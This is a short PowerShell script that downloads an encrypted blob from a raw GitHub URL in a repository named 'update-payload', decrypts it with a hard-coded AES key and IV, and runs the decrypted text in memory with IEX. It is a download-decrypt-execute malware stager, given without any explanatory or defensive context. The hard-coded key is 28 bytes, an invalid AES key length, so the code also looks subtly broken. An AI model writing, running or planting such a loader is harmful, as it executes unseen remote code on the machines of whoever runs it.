$url = "https://raw.githubusercontent.com/raacineagency/update-payload/refs/heads/main/payload.enc"
$b64 = (New-Object Net.WebClient).DownloadString($url) -replace '\s',''
$enc = [Convert]::FromBase64String($b64)
$key = [Text.Encoding]::ASCII.GetBytes("MaCleSecrete1234567890123456")
$iv  = [Text.Encoding]::ASCII.GetBytes("IVde16caracteres")
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = 'CBC'
$aes.Padding = 'PKCS7'
$dec = $aes.CreateDecryptor()
$bytes = $dec.TransformFinalBlock($enc, 0, $enc.Length)
$script = [Text.Encoding]::UTF8.GetString($bytes)
IEX $script
